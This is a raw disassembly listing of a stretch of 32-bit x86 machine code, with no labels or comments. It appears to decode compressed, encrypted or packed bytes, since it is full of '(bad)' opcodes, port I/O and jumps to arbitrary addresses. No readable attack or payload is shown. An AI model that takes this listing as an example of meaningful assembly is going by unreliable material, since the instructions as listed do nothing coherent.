  426e5a:	cmp    al,BYTE PTR [edx]
  426e5c:	ss das 
  426e5e:	and    BYTE PTR [ebx],ah
  426e60:	(bad)  
  426e62:	push   es
  426e63:	mov    esp,0x96850f9f
  426e68:	dec    edx
  426e69:	jmp    0x426e19
  426e6b:	test   al,0xde
  426e6d:	mov    gs,WORD PTR [eax-0x1813df36]
  426e73:	out    0xf9,al
  426e75:	jo     0x426e90
  426e77:	mov    dl,0x54
  426e79:	sbb    edi,DWORD PTR [ebx+eiz*1]
  426e7c:	push   ecx
  426e7d:	mov    bl,0xb5
  426e7f:	lods   al,BYTE PTR ds:[esi]
  426e80:	fisub  WORD PTR ss:[edi+0xa]
  426e84:	aam    0xdb
  426e86:	xchg   esi,eax
  426e87:	test   DWORD PTR [ecx+ecx*8-0x3a],0xf48d62d1
  426e8f:	and    DWORD PTR [ebx-0x8],ecx
  426e92:	pop    edx
  426e93:	add    DWORD PTR [edi],0xf82d1a78
  426e99:	inc    edx
  426e9a:	aam    0xe9
  426e9c:	int3   
  426e9d:	inc    ebp
  426e9e:	popf   
  426e9f:	repnz sub eax,0xc908bce6
  426ea5:	fdivr  st,st(1)
  426ea7:	sub    dh,BYTE PTR [esi]
  426ea9:	(bad)  
  426eaa:	(bad)  
  426eab:	fcom   DWORD PTR [edi]
  426ead:	popa   
  426eae:	test   BYTE PTR [eax-0x5],ch
  426eb1:	sahf   
  426eb2:	adc    edi,0x7fdb4c20
  426eb8:	sbb    eax,0x7d73cab3
  426ebd:	arpl   di,cx
  426ebf:	cmc    
  426ec0:	ret    0xa7d3
  426ec3:	ins    DWORD PTR es:[edi],dx
  426ec4:	int    0xaa
  426ec6:	adc    eax,0xb41cd44a
  426ecb:	addr16 jmp 0x426e56
  426ece:	(bad)  
  426ecf:	sti    
  426ed0:	xchg   ebx,eax
  426ed1:	push   ebp
  426ed2:	(bad)
  426ed5:	xlat   BYTE PTR ds:[ebx]
  426ed6:	mov    esi,0x976c1f66
  426edb:	cwde   
  426edc:	jbe    0x426e95
  426ede:	in     eax,0x22
  426ee0:	mov    bl,0xe0
  426ee2:	push   edi
  426ee3:	fld    DWORD PTR [esi]
  426ee5:	mov    esp,0xe0dd2914
  426eea:	jns    0x426e7e
  426eec:	cmp    BYTE PTR ds:[edi],0xae
  426ef0:	ror    ah,0x26
  426ef3:	ficom  DWORD PTR [ebx]
  426ef5:	pop    edi
  426ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ef7:	xor    ebx,DWORD PTR [ecx+0x6d235370]
  426efd:	sti    
  426efe:	xchg   ebp,eax
  426eff:	dec    esp
  426f00:	es mov eax,0xda6c678
  426f06:	repz jle 0x426f1f
  426f09:	out    dx,eax
  426f0a:	inc    ebx
  426f0b:	jle    0x426f74
  426f0d:	dec    esi
  426f0e:	fldcw  WORD PTR [ebx]
  426f10:	and    eax,0x9b281165
  426f15:	mov    ch,0xd1
  426f17:	and    bh,BYTE PTR ds:0x2c92f210
  426f1d:	gs (bad) 
  426f1f:	out    dx,al
  426f20:	fist   DWORD PTR [ebp+0x11]
  426f23:	ret    0xc61
  426f26:	shl    BYTE PTR [esi+0xf],1
  426f29:	(bad)  
  426f2a:	push   ss
  426f2b:	jecxz  0x426f69
  426f2d:	xchg   edx,eax
  426f2e:	pusha  
  426f2f:	jae    0x426f80
  426f31:	popf   
  426f32:	xchg   DWORD PTR [eax+0xc8368a2],esi
  426f38:	jo     0x426f4c
  426f3a:	mov    WORD PTR [ebx-0x6ba10fb2],?
  426f40:	ret    0x2c54
  426f43:	xchg   ebp,eax
  426f44:	dec    ebx
  426f45:	outs   dx,DWORD PTR ds:[esi]
  426f46:	pop    edi
  426f47:	das    
  426f48:	xchg   ecx,eax
  426f49:	in     eax,dx
  426f4a:	out    dx,eax
  426f4b:	(bad)  
  426f4d:	xor    al,bh
  426f4f:	adc    eax,0xb9db3e1f
  426f54:	stos   DWORD PTR es:[edi],eax
  426f55:	paddusw mm5,QWORD PTR [ecx]
  426f58:	ret    0xdaad
  426f5b:	push   ebp
  426f5c:	push   ds
  426f5d:	adc    ah,BYTE PTR [edx+0x4466a40]
  426f63:	xor    al,0x8a
  426f65:	push   edx
  426f66:	daa    
  426f67:	aaa    
  426f68:	dec    ebx
  426f69:	adc    DWORD PTR [ebx+0xe],0x29
  426f6d:	ret    
  426f6e:	(bad)  
  426f6f:	outs   dx,DWORD PTR ds:[esi]
  426f70:	lea    esi,[ebx-0x72]
  426f73:	inc    edx
  426f74:	clc    
  426f75:	fwait
  426f76:	(bad)
  426f79:	jg     0x426f84
  426f7b:	mov    al,ch
  426f7d:	sbb    eax,0xa3e20b03
  426f82:	(bad)  
  426f83:	jmp    0x426fe3
  426f85:	jae    0x426f74
  426f87:	scas   al,BYTE PTR es:[edi]
  426f88:	std    
  426f89:	add    ecx,esi
  426f8b:	(bad)  
  426f8c:	mov    ebp,0xaf6ebbbe
  426f91:	call   0xcb528a65
  426f96:	pop    es
  426f97:	stos   BYTE PTR es:[edi],al
  426f98:	sbb    al,0x33
  426f9a:	fcomp  DWORD PTR [esi]
  426f9c:	xor    BYTE PTR [ebx],dh
  426f9e:	jmp    0xaa60:0x80778e20
  426fa5:	imul   eax,DWORD PTR [esi+edi*8-0x5],0xffffffb9
  426faa:	add    al,0x21
  426fac:	mov    ah,0x7b
  426fae:	inc    edx
  426faf:	mov    dl,0x8f
  426fb1:	sub    esi,esi
  426fb3:	loope  0x426fdd
  426fb5:	jp     0x426fe8
  426fb7:	iret   
  426fb8:	loopne 0x426f46
  426fba:	out    0xe0,eax
  426fbc:	mov    eax,ebx
  426fbe:	fsub   DWORD PTR [esi+ebp*2+0x25eddb88]
  426fc5:	lds    edx,FWORD PTR [edi+edx*8+0x1]
  426fc9:	jmp    0x42704a
  426fcb:	(bad)  
  426fcc:	xchg   ebx,eax
  426fcd:	cmp    eax,0xb1758a85
  426fd2:	dec    eax
  426fd3:	sub    BYTE PTR [ebp-0x711d830d],bl
  426fd9:	lods   eax,DWORD PTR ds:[esi]
  426fda:	dec    edx
  426fdb:	push   eax
  426fdc:	stos   DWORD PTR es:[edi],eax
  426fdd:	xor    DWORD PTR [esi+0x4929ff45],0xb5612625
  426fe7:	rcr    BYTE PTR [esi+0xbb92dda],1
  426fed:	jl     0x42706a
  426fef:	dec    ebp
  426ff0:	jo     0x42705f
  426ff2:	adc    DWORD PTR [esi+ebx*2],0xc482e89f
  426ff9:	gs pop esp
  426ffb:	jbe    0x426fdf
  426ffd:	mov    ch,0x4
  426fff:	jge    0x426fcc
  427001:	lea    eax,[ebp-0x74]
  427004:	dec    esi
  427005:	mov    bh,0x2d
  427007:	and    eax,0x9cf71322
  42700c:	sbb    bl,BYTE PTR [ebx]
  42700e:	jne    0x426fcd
  427010:	push   eax
  427011:	cmp    al,0x73
  427013:	into   
  427014:	arpl   WORD PTR [edx+0x8022df3],di
  42701a:	(bad)  
  42701b:	(bad)  [si]
  42701e:	pop    ds
  42701f:	pop    edi
  427020:	xchg   esi,eax
  427021:	enter  0x2e8b,0xfd
  427025:	pusha  
  427026:	retf   0x2be4
  427029:	cld    
  42702a:	sbb    al,0x11
  42702c:	dec    edi
  42702d:	mov    esp,0x565b6980
  427032:	fwait
  427033:	das    
  427034:	jl     0x426fe8
  427036:	inc    ebx
  427037:	jno    0x426fc7
  427039:	mov    eax,0x3ffe92e9
  42703e:	popf   
  42703f:	(bad)  
  427040:	dec    ebx
  427041:	xchg   DWORD PTR [ebx+0x78940d27],esp
  427047:	retf   0x2a7b
  42704a:	bswap  esi
  42704c:	hlt    
  42704d:	xor    esi,0xd30ee4ff
  427053:	out    dx,al
  427054:	bound  esp,QWORD PTR [esi+0x5426667c]
  42705a:	push   ss
  42705b:	jb     0x42709c
  42705d:	rcr    BYTE PTR [ebp-0x10102583],1
  427063:	xchg   esi,eax
  427064:	stos   DWORD PTR es:[edi],eax
  427065:	jns    0x427003
  427067:	push   0x9
  427069:	aam    0x78
  42706b:	lods   al,BYTE PTR ds:[esi]
  42706c:	cmc    
  42706d:	rol    DWORD PTR [edx],1
  42706f:	add    BYTE PTR [ebx],bl
  427071:	add    al,0x4e
  427073:	mov    ch,0x89
  427075:	popa   
  427076:	and    DWORD PTR es:[esi],edx
  427079:	or     ah,BYTE PTR [ebx-0x1e2fb8ed]
  42707f:	sbb    DWORD PTR [edi+0x60a4eba7],eax
  427085:	mov    dl,ah
  427087:	ins    DWORD PTR es:[edi],dx
  427088:	push   ds
  427089:	ins    BYTE PTR es:[edi],dx
  42708a:	and    bl,BYTE PTR [ecx-0x2fda9afb]
  427090:	call   0x78a35587
  427095:	sbb    eax,ecx
  427097:	ins    DWORD PTR es:[edi],dx
  427098:	push   0xffffffd7
  42709a:	cwde   
  42709b:	aad    0xd3
  42709d:	lods   eax,DWORD PTR ds:[esi]
  42709e:	popa   
  42709f:	cdq    
  4270a0:	inc    ebp
  4270a1:	in     al,0x43
  4270a3:	add    eax,0xf1939989
  4270a8:	loopne 0x42710e
  4270aa:	xchg   edi,eax
  4270ab:	push   cs
  4270ac:	call   ebp
  4270ae:	add    al,0x6c
  4270b0:	jbe    0x42708f
  4270b2:	stc    
  4270b3:	jecxz  0x427101
  4270b5:	mov    al,ds:0x48c098f8
  4270ba:	ret    0x3049
  4270bd:	outs   dx,DWORD PTR ds:[esi]
  4270be:	sub    edi,0x3c184a6c
  4270c4:	(bad)  
  4270c5:	ds push ebx
  4270c7:	retf   
  4270c8:	inc    ebx
  4270c9:	out    dx,al
  4270ca:	ja     0x4270fe
  4270cc:	dec    edx
  4270cd:	add    eax,0x47c1e648
  4270d2:	in     eax,0xa7
  4270d4:	xlat   BYTE PTR ds:[ebx]
  4270d5:	in     al,0xbe
  4270d7:	sub    eax,0x9147991d
  4270dc:	mov    esi,0x1b0e6ce7
  4270e1:	add    BYTE PTR [edi],dh
  4270e3:	cld    
  4270e4:	ss shr esi,1
  4270e7:	xor    al,0xe9
  4270e9:	push   esi
  4270ea:	sub    eax,0x94a7ac57
  4270ef:	out    0x90,eax
  4270f1:	mov    bh,0xa8
  4270f3:	js     0x427145
  4270f5:	rcr    BYTE PTR [ebx+0x120a580e],cl
  4270fb:	es inc eax
  4270fd:	jmp    0xe9f0:0x6aa1762f
  427104:	fsub   QWORD PTR [edi]
  427106:	int    0xd4
  427108:	jbe    0x427104
  42710a:	das    
  42710b:	jp     0x427127
  42710d:	mov    eax,0x67076c97
  427112:	mov    eax,ds:0x2e0e276e
  427117:	adc    ecx,DWORD PTR [ebx]
  427119:	sbb    BYTE PTR ds:0xfdb716f3,0x3c
  427120:	mov    dh,0x39
  427122:	xlat   BYTE PTR ds:[ebx]
  427123:	add    eax,0x79e88ab6
  427128:	add    al,0xe6
  42712a:	push   es
  42712b:	inc    edi
  42712c:	outs   dx,DWORD PTR ds:[esi]
  42712d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42712e:	mov    ds:0x9a141758,al
  427133:	clc    
  427134:	pop    ebx
  427135:	mov    eax,ds:0xfe1809bd
  42713a:	rcr    cl,cl
  42713c:	push   edi
  42713d:	cs inc ebp
  42713f:	and    eax,0x10f37e57
  427144:	js     0x42711f
  427146:	fadd   QWORD PTR [ebx-0xcd48ded]
  42714c:	dec    eax
  42714d:	push   ecx
  42714e:	push   ds
  42714f:	mov    dl,0x38
  427151:	test   DWORD PTR ds:0x1eff326,edx
  427157:	xchg   esp,eax
  427158:	xor    al,0x45
  42715a:	rcr    BYTE PTR [ebp-0x47],1
  42715d:	sbb    al,0x59
  42715f:	test   al,0x85
  427161:	jp     0x427121
  427163:	jle    0x427191
  427165:	ror    ah,0x88
  427168:	imul   esp,edx,0x13
  42716b:	push   0x25444a4
  427170:	add    al,0x60
  427172:	xchg   ecx,eax
  427173:	xchg   esp,eax
  427174:	movhps xmm4,QWORD PTR [ebx+ecx*4]
  427178:	xor    ebp,DWORD PTR [ebx-0x762b8fdd]
  42717e:	dec    esp
  42717f:	nop
  427180:	mov    al,ds:0x739b1a60
  427185:	cmp    al,0x7b
  427187:	in     eax,0xa4
  427189:	pop    ebx
  42718a:	mov    fs,esp
  42718c:	test   al,0x7b
  42718e:	mov    cl,0x2
  427190:	ds xchg edx,eax
  427192:	gs pop ds
  427194:	jl     0x4271ce
  427196:	inc    edi
  427197:	imul   edi,edi,0x4c972d9f
  42719d:	cmp    DWORD PTR [ecx-0x64],0x38
  4271a1:	popf   
  4271a2:	bound  esp,QWORD PTR [ecx-0x9]
  4271a5:	xor    DWORD PTR [ecx+0x359875de],edx
  4271ab:	dec    esi
  4271ac:	cmp    eax,DWORD PTR [eax]
  4271ae:	add    BYTE PTR [eax],al
  4271b0:	add    BYTE PTR [eax],al
  4271b2:	sub    eax,DWORD PTR [edi-0xc021e8b]
  4271b8:	mov    edi,0x7da68ccf
  4271bd:	inc    ecx
  4271be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271bf:	daa    
  4271c0:	adc    ch,0xa1
  4271c3:	jmp    0x53571c9
  4271c8:	add    BYTE PTR [eax],al
  4271ca:	jns    0x42718d
  4271cc:	pop    esp
  4271cd:	cdq    
  4271ce:	out    0x60,eax
  4271d0:	and    DWORD PTR [edi+0x127bdbe9],0xe88b4f20
  4271da:	sub    al,dh
  4271dc:	mov    ebx,0xcdfb0f5c
  4271e1:	les    eax,FWORD PTR [eax-0x6d]
  4271e4:	out    dx,al
  4271e5:	inc    ebx
  4271e6:	lahf   
  4271e7:	in     eax,dx
  4271e8:	les    esp,FWORD PTR [edi+0x6006d6c1]
  4271ee:	cld    
  4271ef:	adc    al,0x61
  4271f1:	ja     0x4271c9
  4271f3:	cmp    BYTE PTR [esi-0x3a],ah
  4271f6:	xchg   edx,eax
  4271f7:	inc    edi
  4271f8:	jecxz  0x42719c
  4271fa:	push   es
  4271fb:	ja     0x4271b2
  4271fd:	mov    al,0x2a
  4271ff:	adc    ecx,edx
  427201:	jo     0x427267
  427203:	mov    BYTE PTR [ebx+0x4f],dl
  427206:	fnstsw WORD PTR [eax+0x3e]
  427209:	arpl   WORD PTR fs:[esi-0x6e42da16],sp
  427210:	outs   dx,BYTE PTR ds:[esi]
  427211:	test   BYTE PTR [ebx+ebx*2-0x49],0x41
  427216:	inc    esi
  427217:	mov    al,0x9e
  427219:	fild   QWORD PTR [eax]
  42721b:	or     esp,esp
  42721d:	aam    0xc6
  42721f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427220:	xor    dh,BYTE PTR [edx+0x20345063]
  427226:	jbe    0x427266
  427228:	mov    esp,0x4d915781
  42722d:	arpl   WORD PTR [edx+0x7],si
  427230:	sub    BYTE PTR [edx-0x3854d1a0],dl
  427236:	pop    ds
  427237:	mov    ebp,0x7291fe5e
  42723c:	push   ebp
  42723d:	sub    eax,0x60fa01c3
  427242:	ror    ch,1
  427244:	cmp    DWORD PTR [eax-0x68],0x4b
  427248:	(bad)  
  427249:	hlt    
  42724a:	and    BYTE PTR [edi-0x2905fa1a],ch
  427250:	lods   eax,DWORD PTR ds:[esi]
  427251:	aaa    
  427252:	je     0x42729a
  427254:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  427256:	add    ebx,DWORD PTR [edx-0x5b]
  427259:	jne    0x4272b6
  42725b:	in     al,0x9a
  42725d:	adc    ecx,DWORD PTR [ebx+0x63]
  427260:	loop   0x42725c
  427262:	sar    BYTE PTR [eax],0xd5
  427265:	test   DWORD PTR [ecx+edx*4+0x66ad495d],eax
  42726c:	fdecstp 
  42726e:	mov    ecx,0x80d4acf2
  427273:	and    BYTE PTR [edx-0x7f8ca983],bl
  427279:	or     BYTE PTR [eax+0x48],0x17
  42727d:	mov    ds:0x1c033ee7,eax
  427282:	mov    dh,BYTE PTR [edi]
  427284:	xor    eax,0xa7de61d6
  427289:	cmp    bl,dl
  42728b:	add    eax,DWORD PTR [esi+0x6a]
  42728e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42728f:	out    0xf6,al
  427291:	mov    DWORD PTR ds:0xf8a0d92c,ebp
  427297:	std    
  427298:	fcmovu st,st(3)
  42729a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42729b:	call   0xf5ad0a9
  4272a0:	mov    ebp,0x105aaefd
  4272a5:	test   eax,0xd98ee8d1
  4272aa:	test   BYTE PTR [edx],dh
  4272ac:	lock pop ss
  4272ae:	inc    ebx
  4272af:	inc    edx
  4272b0:	xchg   ecx,eax
  4272b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4272b2:	mul    BYTE PTR [esi]
  4272b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4272b5:	test   DWORD PTR [ebp+0x4b],esp
  4272b8:	mov    eax,0xc0da4b31
  4272bd:	or     al,0xb9
  4272bf:	sar    DWORD PTR [edx],0x14
  4272c2:	les    esi,FWORD PTR [eax]
  4272c4:	bound  esp,QWORD PTR [esi+eax*8+0x38]
  4272c8:	jb     0x4272e8
  4272ca:	mov    edx,0xa364814d
  4272cf:	mov    ebp,0x2eb942f9
  4272d4:	repz mov dh,0xb7
  4272d7:	pusha  
  4272d8:	fdivr  st,st(2)
  4272da:	sbb    BYTE PTR [esi+0x7730ae06],bl
  4272e0:	not    DWORD PTR [edi]
  4272e2:	fwait
  4272e3:	(bad)  
  4272e4:	retf   
  4272e5:	das    
  4272e6:	jmp    0x5c59390b
  4272eb:	dec    ecx
  4272ec:	loope  0x4272e3
  4272ee:	push   edx
  4272ef:	push   eax
  4272f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272f1:	dec    edx
  4272f2:	xchg   esi,eax
  4272f3:	jl     0x427325
  4272f5:	add    eax,DWORD PTR [ebx-0x64]
  4272f8:	imul   edx,DWORD PTR [ebp+0x48],0x79bdbdec
  4272ff:	push   es
  427300:	or     bl,cl
  427302:	das    
  427303:	not    DWORD PTR [ebx+edx*4]
  427306:	jo     0x4272f3
  427308:	inc    esi
  427309:	(bad)  
  42730a:	mov    bh,0x9b
  42730c:	idiv   BYTE PTR [esi+0x32d7877d]
  427312:	ret    0x6e39
  427315:	sbb    eax,0x14c54844
  42731a:	pusha  
  42731b:	xchg   edx,eax
  42731c:	call   FWORD PTR [edi]
  42731e:	daa    
  42731f:	fbld   TBYTE PTR [ecx+eax*4-0x57]
  427323:	test   BYTE PTR [edi+0x2b],ah
  427326:	inc    eax
  427327:	or     edx,DWORD PTR ds:0xb6ea1184
  42732d:	mov    esp,0x5d809c54
  427332:	ins    BYTE PTR es:[edi],dx
  427333:	inc    esp
  427334:	int    0x34
  427336:	aaa    
  427337:	icebp  
  427338:	aas    
  427339:	cld    
  42733a:	mov    ds:0xede6d119,ax
  427340:	push   es
  427341:	fnstcw WORD PTR [edx]
  427343:	inc    esp
  427344:	outs   dx,BYTE PTR ds:[esi]
  427345:	popf   
  427346:	sbb    eax,0x60312b7a
  42734b:	sbb    ebp,eax
  42734d:	ret    0xc79e
  427350:	adc    al,0x5d
  427352:	cmp    ebp,edi
  427354:	jge    0x42732f
  427356:	imul   ecx
  427358:	or     eax,0xedfd30
  42735d:	mov    esp,0x972d0f74
  427362:	mov    bl,0x7d
  427364:	fmul   DWORD PTR [edi-0x19]
  427367:	push   ecx
  427368:	and    DWORD PTR [ebx-0x5acbd554],ecx
  42736e:	xchg   esp,eax
  42736f:	sbb    DWORD PTR [ecx],ebx
  427371:	add    ecx,edx
  427373:	ss adc al,0x6b
  427376:	bound  eax,QWORD PTR [ecx+0x36]
  427379:	dec    esp
  42737a:	icebp  
  42737b:	ret    0xd592
  42737e:	bound  ecx,QWORD PTR [ebp+0x20]
  427381:	ss into 
  427383:	(bad)
  427387:	inc    eax
  427388:	iret   
  427389:	imul   ebx,edi,0xffffffe9
  42738c:	je     0x4273ca
  42738e:	mov    ch,0x8f
  427390:	push   edx
  427391:	pop    ecx
  427392:	ins    DWORD PTR es:[edi],dx
  427393:	mov    ebx,0xe37e1973
  427398:	and    eax,0x4d0ae9b7
  42739d:	(bad)  
  42739e:	repnz push edx
  4273a0:	cmp    eax,0x165426e2
  4273a5:	push   ds
  4273a6:	daa    
  4273a7:	inc    edx
  4273a8:	add    al,0x5b
  4273aa:	mov    dh,0xe8
  4273ac:	push   edx
  4273ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273ae:	sub    al,0x5f
  4273b0:	repnz push ecx
  4273b2:	scas   al,BYTE PTR es:[edi]
  4273b3:	mov    ds:0xbff37d70,al
  4273b8:	xor    eax,0x9894ed59
  4273bd:	cmp    al,BYTE PTR [ebp-0x41]
  4273c0:	or     DWORD PTR [edx+eiz*2+0x3736c2a8],0xc
  4273c8:	mov    bl,0xe4
  4273ca:	popf   
  4273cb:	push   edi
  4273cc:	stc    
  4273cd:	push   cs
  4273ce:	fcom   QWORD PTR [ebp-0x2b0ae64f]
  4273d4:	dec    BYTE PTR [ebp+0x7723d7cc]
  4273da:	in     eax,dx
  4273db:	adc    eax,0x13e5cf45
  4273e0:	push   esp
  4273e1:	jmp    0x427425
  4273e3:	je     0x42741b
  4273e5:	mov    ah,0xd1
  4273e7:	jo     0x4273b5
  4273e9:	xchg   esi,eax
  4273ea:	adc    ch,BYTE PTR [ecx]
  4273ec:	out    0x3c,eax
  4273ee:	outs   dx,BYTE PTR ds:[esi]
  4273ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273f0:	mov    ebp,DWORD PTR [ecx-0x3ae2e6ff]
  4273f6:	mov    dl,0x7
  4273f8:	dec    ebp
  4273f9:	lahf   
  4273fa:	sbb    DWORD PTR ds:0x4389bbab,ebx
  427400:	push   ebp
  427401:	inc    esp
  427402:	(bad)  
  427403:	nop
  427404:	test   DWORD PTR fs:[esi-0xc],ecx
  427408:	std    
  427409:	and    esp,DWORD PTR [eax-0x2f]
  42740c:	(bad)  [ebx+esi*4]
  42740f:	jb     0x42746c
  427411:	std    
  427412:	mov    DWORD PTR [ebx],ebx
  427414:	ror    BYTE PTR [eax+0xe],cl
  427417:	pop    edi
  427418:	push   edx
  427419:	int3   
  42741a:	test   BYTE PTR [edi+0x58c5e62],cl
  427420:	xor    BYTE PTR [esi+0x9da0d],0x6c
  427427:	adc    dh,BYTE PTR [ebx+ecx*8-0x6e]
  42742b:	fiadd  DWORD PTR [ecx+edx*1+0x65]
  42742f:	std    
  427430:	int    0xfe
  427432:	enter  0x6504,0xbe
  427436:	loope  0x427493
  427438:	xor    eax,0x76ba5f2a
  42743d:	adc    al,0xfc
  42743f:	aad    0xd4
  427441:	cmp    DWORD PTR [ebp+esi*1-0x4a],edi
  427445:	mov    ds:0xa66da1ce,eax
  42744a:	or     al,0x43
  42744c:	scas   al,BYTE PTR es:[edi]
  42744d:	cmp    BYTE PTR [edx-0x4c],dh
  427450:	and    esp,DWORD PTR [edi+0x76]
  427453:	mov    ah,0x5f
  427455:	push   0xffffffcb
  427457:	(bad)  
  427459:	(bad)  
  42745a:	cmp    eax,0x8e2b53d9
  42745f:	ins    BYTE PTR es:[edi],dx
  427460:	mov    cl,BYTE PTR [esi+0x6e647903]
  427466:	ds (bad) 
  427468:	je     0x42746b
  42746a:	lods   eax,DWORD PTR ds:[esi]
  42746b:	push   cs
  42746c:	jmp    0xff25a6e7
  427471:	mov    bh,0x1e
  427473:	dec    ecx
  427474:	jg     0x42748f
  427476:	pop    ss
  427477:	gs popa 
  427479:	leave  
  42747a:	and    edx,DWORD PTR [esi]
  42747c:	dec    edx
  42747d:	dec    esi
  42747e:	sar    dl,0x2d
  427481:	jo     0x4274d9
  427483:	add    dl,dl
  427485:	push   ebp
  427486:	add    DWORD PTR ds:0xd51a0f89,edx
  42748c:	add    eax,0x993d7925
  427491:	int3   
  427492:	xor    BYTE PTR [ecx+0x185fc7f8],dl
  427498:	lock jmp 0xd8f4:0x27a1348d
  4274a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274a1:	aam    0x4a
  4274a3:	leave  
  4274a4:	inc    ch
  4274a6:	mov    ds:0xcc15298b,eax
  4274ab:	sbb    BYTE PTR [eax-0xa690232],dl
  4274b1:	push   cs
  4274b2:	sbb    eax,0xeea4e727
  4274b7:	sub    eax,0x9a3c3ce1
  4274bc:	in     al,dx
  4274bd:	daa    
  4274be:	xor    dh,BYTE PTR [edx]
  4274c0:	or     al,0xc6
  4274c2:	mov    BYTE PTR ds:0x11fff120,cl
  4274c8:	dec    ebp
  4274c9:	out    dx,eax
  4274ca:	xchg   esi,eax
  4274cb:	xchg   esi,eax
  4274cc:	or     DWORD PTR [eax+0x5b49e777],eax
  4274d2:	outs   dx,DWORD PTR ds:[esi]
  4274d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274d4:	mov    ?,WORD PTR [edx-0x1c]
  4274d7:	loop   0x427554
  4274d9:	adc    al,0x79
  4274db:	ror    DWORD PTR [eax],1
  4274dd:	inc    eax
  4274de:	sti    
  4274df:	stos   BYTE PTR es:[edi],al
  4274e0:	aaa    
  4274e1:	and    ebp,DWORD PTR [ebp-0x3]
  4274e4:	xchg   esi,eax
  4274e5:	hlt    
  4274e6:	xor    al,0x22
  4274e8:	sti    
  4274e9:	or     eax,0x17fa561c
  4274ee:	pop    ebx
  4274ef:	xor    esi,esi
  4274f1:	xchg   esp,eax
  4274f2:	in     al,dx
  4274f3:	ds fdivr st(6),st
  4274f6:	stc    
  4274f7:	sar    BYTE PTR [eax],0xd3
  4274fa:	lds    esi,FWORD PTR [edi-0x2127a377]
  427500:	jp     0x4274fb
  427502:	or     cl,BYTE PTR [ebx+0x39]
  427505:	and    al,0xb
  427507:	jp     0x4274cc
  427509:	sub    cl,BYTE PTR [ecx-0x7b]
  42750c:	ins    DWORD PTR es:[edi],dx
  42750d:	gs (bad) 
  42750f:	int3   
  427510:	clc    
  427511:	pop    ds
  427512:	clc    
  427513:	fstp   TBYTE PTR [esi+0x2dfee24c]
  427519:	dec    ecx
  42751a:	add    ecx,DWORD PTR [ebp-0x26]
  42751d:	add    DWORD PTR [ebp+0x75],eax
  427520:	inc    ecx
  427521:	stc    
  427522:	mov    al,0x5d
  427524:	xchg   ebx,eax
  427525:	clc    
  427526:	pop    edi
  427527:	popf   
  427528:	aam    0x31
  42752a:	scas   eax,DWORD PTR es:[edi]
  42752b:	jo     0x427534
  42752d:	loopne 0x4274c8
  42752f:	mov    ch,0x65
  427531:	xchg   ecx,eax
  427532:	adc    al,0x13
  427534:	mov    dh,0x3
  427536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427537:	loop   0x427534
  427539:	xor    eax,0x7f0d959a
  42753e:	push   ecx
  42753f:	das    
  427540:	push   eax
  427541:	xor    eax,DWORD PTR [eax+0x49]
  427544:	bound  eax,QWORD PTR [ebp-0x2f]
  427547:	cmp    bh,BYTE PTR [edi-0x2f]
  42754a:	and    BYTE PTR [di+0x45],dl
  42754e:	pop    edi
  42754f:	ins    BYTE PTR es:[edi],dx
  427550:	or     al,0x30
  427552:	jmp    DWORD PTR [edx]
  427554:	mov    eax,ds:0x8c472394
  427559:	inc    edi
  42755a:	cli    
  42755b:	(bad)  
  42755c:	pop    edx
  42755d:	in     al,dx
  42755e:	jle    0x42753a
  427560:	lahf   
  427561:	and    DWORD PTR [ebx],ebp
  427563:	test   eax,0xccb6e771
  427568:	mov    ch,BYTE PTR [esi+0x2b]
  42756b:	adc    al,0x30
  42756d:	inc    eax
  42756e:	popf   
  42756f:	into   
  427570:	xor    eax,0xe0910cb7
  427575:	lahf   
  427576:	sub    al,0x90
  427578:	fs cmc 
  42757a:	cli    
  42757b:	out    dx,eax
  42757c:	daa    
  42757d:	psubusw mm1,QWORD PTR [edi+0xfc8bf97]
  427584:	fwait
  427585:	test   al,0x6c
  427587:	imul   ecx,DWORD PTR [ecx],0x2145eb02
  42758d:	clc    
  42758e:	imul   ecx,DWORD PTR [ecx*4+0x704112f8],0x9c92a08f
  427599:	call   0x697ded7
  42759e:	adc    eax,0xf3aa8ad5
  4275a3:	outs   dx,BYTE PTR ds:[esi]
  4275a4:	mov    DWORD PTR [eax],eax
  4275a6:	cmc    
  4275a7:	arpl   WORD PTR [eax+esi*2],bp
  4275aa:	cs loopne 0x4275bd
  4275ad:	inc    ebp
  4275ae:	(bad)  
  4275af:	mov    dh,0x34
  4275b1:	jne    0x952d89a6
  4275b7:	imul   edi,DWORD PTR [esi+0x38],0xb3889f2a
  4275be:	and    eax,0xf7bb9ff4
  4275c3:	(bad)  [edx]
  4275c5:	push   ebx
  4275c6:	outs   dx,DWORD PTR ds:[esi]
  4275c7:	aam    0xac
  4275c9:	pop    eax
  4275ca:	cmc    
  4275cb:	hlt    
  4275cc:	mov    eax,ds:0xad4f6f56
  4275d1:	enter  0xc1a2,0xd0
  4275d5:	mov    ecx,0xbfb9e5c4
  4275da:	dec    ecx
  4275db:	clc    
  4275dc:	dec    ecx
  4275dd:	std    
  4275de:	push   esi
  4275df:	int3   
  4275e0:	add    dh,cl
  4275e2:	pop    ebp
  4275e3:	into   
  4275e4:	popf   
  4275e5:	mov    al,ds:0x9814c0f7
  4275ea:	dec    DWORD PTR [esi+eiz*2-0x1130575]
  4275f1:	mov    ecx,0xbdde7dd0
  4275f6:	lock adc BYTE PTR [ecx-0x17e5b7b5],ah
  4275fd:	in     al,0x54
  4275ff:	jbe    0x42761c
  427601:	mov    ds:0xf297a82f,al
  427606:	into   
  427607:	jmp    FWORD PTR [edx]
  427609:	clc    
  42760a:	les    ebp,FWORD PTR [ebp+edi*4+0x6e0b3ee7]
  427611:	or     BYTE PTR [eax-0x7c],cl
  427614:	popa   
  427615:	jmp    0xf5ab:0x17f8c4f7
